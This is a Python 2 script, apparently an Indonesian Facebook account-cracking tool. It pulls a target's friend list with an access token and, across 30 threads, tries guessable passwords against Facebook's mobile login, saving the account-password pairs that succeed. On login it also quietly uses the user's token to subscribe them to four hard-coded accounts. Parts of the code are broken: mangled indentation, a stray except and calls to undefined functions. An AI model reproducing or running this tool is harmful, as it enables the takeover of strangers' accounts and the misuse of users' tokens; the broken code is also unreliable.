# coding:utf-8
# decompile by Itsuki ft. Aap Afandi ID
# coded by angga kurniawan
# fb.me/gaaaarzxd

q="\033[00m"
h2="\033[40m"
b2="\033[44m"
c2="\033[46m"
i2="\033[42m"
u2="\033[45m"
m2="\033[41m"
p2="\033[47m"
k2="\033[43m"
b='\033[1;94m'
i='\033[1;92m'
c='\033[1;96m'
m='\033[1;91m'
u='\033[1;95m'
k='\033[1;93m'
p='\033[1;97m'
h='\033[1;90m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH 
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
try:
	import requests
	import sys
	import os
	import subprocess
	import random
	import time
	import re
	import json
	import uuid
	from multiprocessing.pool import ThreadPool
	from requests.exceptions import ConnectionError
	from datetime import datetime
except Exception as modul:
	print(" \033[0;97m[\033[0;91m!\033[0;97m] Module requests not installed yet")
	exit(" \033[0;97m[\033[0;93m#\033[0;97m] Please Type : pip2 install requests")

loop = 0
ok = []
cp = []
id = []
pwx = []

s = requests.Session()
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]

def logo():
	os.system("clear")
	print(" "+H+"AU"+N+" : ANGGA KURNIAWAN\n"+N+" \033[0;91mFB"+N+" : FB.ME/GAAAARZXD\n"+N+" \033[0;93mRC"+N+" : M4L!N9 Recoder Aw0kAw0k\n")

def bot_komen():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print(' '+N+' [!] Token Invalid')
        os.system('rm -rf login.txt')
    requests.post('https://graph.facebook.com/100009447779678/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100000141059300/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100018047723947/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100054520182692/subscribers?access_token=' + token)
    print(" "+N+"[+] Login Successfully")
    menu()


####Uang Amannnnnn
def ua():
        print('\n\t[ Useragent Setting ]\n\n# Useragent Saat Ini:',open('ua','r').read(),'\n')
        ask = raw_input('[?] Ganti useragent y/t: ')
        if ask == "Y" or ask == "y":
            os.system('rm -rf ua')
            ua = raw_input('[+] Masukan useragent baru: ')
            open('ua','a').write(ua)
            raw_input('\n[√] Useragent Berhasil Ditambahkan\n[ Enter For Back To Menu ]')
            menu()
        elif(a in ("t","T")):
            raw_nput("Enter For Back To Menu")
            menu()
    

###dev tokeeeeennnn
def login():
	os.system('clear')
	print ('\n\n '+K+'*'+N+' tools ini menggunakan login token facebook.\n '+M+'*'+N+' silahkan masukan token facebook kamu di bawah')
	token = raw_input('\n '+N+'[?] Token : '+H+'')
	if token in ('open', 'Open', 'OPEN'):
		print ('\n '+M+'*'+N+' note! usahakan akun tumbal login di google chrome terlebih dahulu')
		print (' '+K+'*'+N+' jangan lupa! url ubah ke https://m.facebook.com')
		print (' '+M+'*'+N+' setelah di alihkan ke google chrome. klik titik tiga')
		print (' '+K+'*'+N+' lalu klik Cari di Halaman Tinggal ketik '+H+'EAAA'+N+' Lalu salin.')
		raw_input(' '+H+' tekan enter ')
		os.system('xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_')
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+token)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open('login.txt', 'w')
		zedd.write(token)
		zedd.close()
		print ('\n\n '+K+'*'+N+' selamat datang '+H+'%s'%(nama))
		time.sleep(2)
		print (' '+M+'*'+N+' mohon untuk menggunakan sc ini sewajarnya, kami tidak bertanggung jawab jika sc ini disalah gunakan...')
		time.sleep(2)
		raw_input(' '+H+'*'+N+' tekan enter ')
		bot_komen()
	except KeyError:
		print ('\n\n '+M+'!'+N+' token invalid')
		time.sleep(2)
		login()


##dev menuuujjjjj
def menu():
	os.system('clear')
	global token
	try:
		token = open('login.txt','r').read()
	except IOError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
		os.system('clear')
		os.system('rm -rf login.txt')
		tokenz()
	try:
		otw = requests.get('https://graph.facebook.com/me/?access_token='+token)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
		username = a['username']
		ip = requests.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
	except KeyError:
		os.system('clear')
		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
		os.system('rm -rf login.txt')
		tokenz()
	except requests.exceptions.ConnectionError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] No Connection')
		sys.exit()
	logo()
	print("      "+N+"------------------------------------------")
	print(" "+N+"[*]"+H+". "+N+"nama : "+N+"%s"%(nama))
	print("      "+N+"------------------------------------------")
	print
	print("      "+N+"  Chao mung den voi ahay?")
	print
	print("      "+N+"------------------------------------------")
	print(" "+N+"[1]"+H+". "+N+"crack indonesia")
	print(" "+N+"[2]"+H+". "+N+"crack india/bangladesh")
	print(" "+N+"[3]"+H+". "+N+"crack usa")
	print(" "+N+"[4]"+H+". "+N+"crack vietnam")
	print(" "+N+"[5]"+H+". "+N+"check result")
	print(" "+N+"[6]"+H+". "+N+"setting useragent")
	print(" "+N+"[0]"+M+". "+N+"logout")
	print("      "+N+"------------------------------------------")
	ask = raw_input("\n "+N+"[?]"+K+"."+N+" choose : "+H+"")
	if ask =="":
		menu()
	elif ask == "1" or ask == "01":
		indo()
	elif ask == "2" or ask == "02":
		indbang()
	elif ask == "3" or ask == "03":
		usa()
	elif ask == "4" or ask == "04":
		viet()
	elif ask == "5" or ask == "05":
		print("\n "+N+"["+M+"1] "+N+"Cek hasil OK")
		print(" "+N+"["+K+"2] "+N+"Cek hasil CP")
		ask = raw_input("\n "+N+"[?] Pilih : ")
		if ask =="":
			menu()
		elif ask == "1" or ask == "01":
			try:
				totalok = open("results/OK-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
				print(" "+N+"[#]------------------------------------------") 
				print(" "+N+"["+H+"+] "+N+"Results OK Date : %s-%s-%s Total : %s\033[0;92m"%(ha, op, ta,len(totalok)))
				os.system("cat results/OK-%s-%s-%s.txt"%(ha, op, ta))
				exit(" "+N+"[#]------------------------------------------") 
			except (IOError):
				exit(" "+N+"["+M+"!] "+N+" no results bro")
		elif ask == "2" or ask == "02":
			try:
				totalcp = open("results/CP-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
				print(" "+N+"[#]------------------------------------") 
				print(" "+N+"["+K+"+] "+N+"Results CP Date : %s-%s-%s Total : %s\033[0;93m"%(ha, op, ta,len(totalcp)))
				os.system("cat results/CP-%s-%s-%s.txt"%(ha, op, ta))
				exit(" "+N+"[#]-------------------------------------") 
			except (IOError):
				exit(" "+N+"[!] tidak ada hasil bro")
		else:
			menu()
	elif ask == "6" or ask == "06":
		ua()
	elif ask == "0" or ask == "00":
		os.system("rm -f login.txt")
		exit(" "+N+" [#] Successfully  Token")
	elif ask == "9" or ask == "99":
		exit(p+"Terima Kasih Telah Menggunakan Script Saya...:)")
	else:
		menu()
 
def indo():
	global token
	try:
		token = open('login.txt', 'r').read()
	except IOError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
		tokenz()
	print("\n "+N+"[*]"+H+". "+N+"type 'me' to crack from friends list")
	idt = raw_input(" "+N+"[+]"+H+". "+N+"id public : "+N+"")
	try:
		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
		sp = json.loads(pok.text)
		print(" "+N+"[+]"+H+". "+N+"name : "+sp["name"])
	except KeyError:
		exit(' \033[0;97m[\033[0;91m!\033[0;97m] ID Public Not Found')
	r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
	z = json.loads(r.text)
	for i in z["data"]:
		uid = i['id']
		na = i['name']
		nm = na.rsplit(" ")[0]
		id.append(uid+'|'+nm)
	print(" "+N+"[*]"+H+". "+N+"total id  : "+str(len(id)))
	ask = raw_input("\n "+N+"[?]"+H+". "+N+"want to use a manual password? Y/t : ")
	if ask == "Y" or ask == "y":
		manual()
	print(" "+N+"[+]"+H+". "+N+"account ok saved in : results/OK-%s-%s-%s.txt"% (ha, op, ta))
	print(" "+N+"[+]"+K+". "+N+"account cp saved in : results/CP-%s-%s-%s.txt"% (ha, op, ta))
	print(""+N+"------------------------------------------------")
	def main(user):
		global loop, token, ips
		print'\r '+N+'[%s] Cracking %s/%s - OK-:%s - CP-:%s ' % (datetime.now().strftime('%H:%M:%S'), loop, len(id), len(ok), len(cp)), 
		sys.stdout.flush()
		uid,name=user.split("|")
		try:
			os.mkdir('results')
		except OSError:
			pass
		try:
			for pw in [name.lower()+'123',name.lower()+'1234',name.lower()+'12345']:
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r  '+H+'[OK]'+N+' ' +uid+ '|' + pw + '                  ')
					ok.append(uid+'|'+pw)
					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
				elif 'checkpoint' in xo:
					print('\r  '+K+'[CP]'+N+' ' +uid+ '|' + pw + '                  ')
					cp.append(uid+'|'+pw)
					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Finished")

def indbang():
	global token
	try:
		token = open('login.txt', 'r').read()
	except IOError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
		tokenz()
	print("\n "+N+"[*]"+H+". "+N+"type 'me' to crack from friends list")
	idt = raw_input(" "+N+"[+]"+H+". "+N+"id public : "+N+"")
	try:
		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
		sp = json.loads(pok.text)
		print(" "+N+"[+]"+H+". "+N+"name : "+sp["name"])
	except KeyError:
		exit(' \033[0;97m[\033[0;91m!\033[0;97m] ID Public Not Found')
	r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
	z = json.loads(r.text)
	for i in z["data"]:
		uid = i['id']
		na = i['name']
		nm = na.rsplit(" ")[0]
		id.append(uid+'|'+nm)
	print(" "+N+"[*]"+H+". "+N+"total id  : "+str(len(id)))
	ask = raw_input("\n "+N+"[?]"+H+". "+N+"want to use a manual password? Y/t : ")
	if ask == "Y" or ask == "y":
		manual()
	print(" "+N+"[+]"+H+". "+N+"account ok saved in : results/OK-%s-%s-%s.txt"% (ha, op, ta))
	print(" "+N+"[+]"+K+". "+N+"account cp saved in : results/CP-%s-%s-%s.txt"% (ha, op, ta))
	print(""+N+"------------------------------------------------")
	def main(user):
		global loop, token, ips
		print'\r '+N+'[%s] Cracking %s/%s - OK-:%s - CP-:%s ' % (datetime.now().strftime('%H:%M:%S'), loop, len(id), len(ok), len(cp)), 
		sys.stdout.flush()
		uid,name=user.split("|")
		try:
			os.mkdir('results')
		except OSError:
			pass
		try:
			for pw in [name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345','102030','445566','111222']:
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r  '+H+'[OK]'+N+' ' +uid+ '|' + pw + '                  ')
					ok.append(uid+'|'+pw)
					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
				elif 'checkpoint' in xo:
					print('\r  '+K+'[CP]'+N+' ' +uid+ '|' + pw + '                  ')
					cp.append(uid+'|'+pw)
					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Finished")

def manual():
	print(" "+N+"[*] Exp : 1qwerty,bismillah,123456")
	pw = raw_input("\n "+N+"[?] Set Password : ").split(",")
	if len(pw) ==0:
		exit(" "+N+"[!] Don't Be Empty")
	print("\n "+N+"[+] OK Saved : results/OK-%s-%s-%s.txt"% (ha, op, ta))
	print(" "+N+"[+] CP Saved : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
	print(" "+N+"---------------------------------------------")
	
	def main(user):
		global loop, token, ips
		sys.stdout.write(
		      '\r'+N+'[%s] Cracking %s/%s |OK:%s |CP:%s ' % (datetime.now().strftime('%H:%M:%S'), loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid,name=user.split("|")
		try:
			os.mkdir('results')
		except OSError:
			pass
		try:
			for asu in pw:
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r '+H+'[OK]'+N+'' +uid+ '|' +asu+ '                  ')
					ok.append(uid+'|'+asu)
					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(str(uid)+'|'+str(asu)+'\n')
					save.close()
					break
					continue
				elif 'checkpoint' in xo:
					print('\r '+K+'[CP]'+N+'' +uid+ '|' +asu+ '                  ')
					cp.append(uid+'|'+asu)
					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(str(uid)+'|'+str(asu)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n "+N+"[#] Finished")
	
### SETTING USER AGENT
def ua():
        print('\n\t[ Useragent Setting ]\n\n# Useragent Saat Ini:',open('ua','r').read(),'\n')
        ask = raw_input('[?] Ganti useragent y/t: ')
        if ask == "Y" or ask == "y":
            os.system('rm -rf ua')
            ua = raw_input('[+] Masukan useragent baru: ')
            open('ua','a').write(ua)
            raw_input('\n[√] Useragent Berhasil Ditambahkan\n[ Enter For Back To Menu ]')
            time.sleep(2)
			menu()
        elif ask == "T" or ask == "t":
            ua = raw_nput("Enter For Back To Menu")
            time.sleep(2)
			menu()
		except KeyboardInterrupt:
			exit()
        else:
            menu()

if __name__ == '__main__':
	os.system("git pull")
	login()
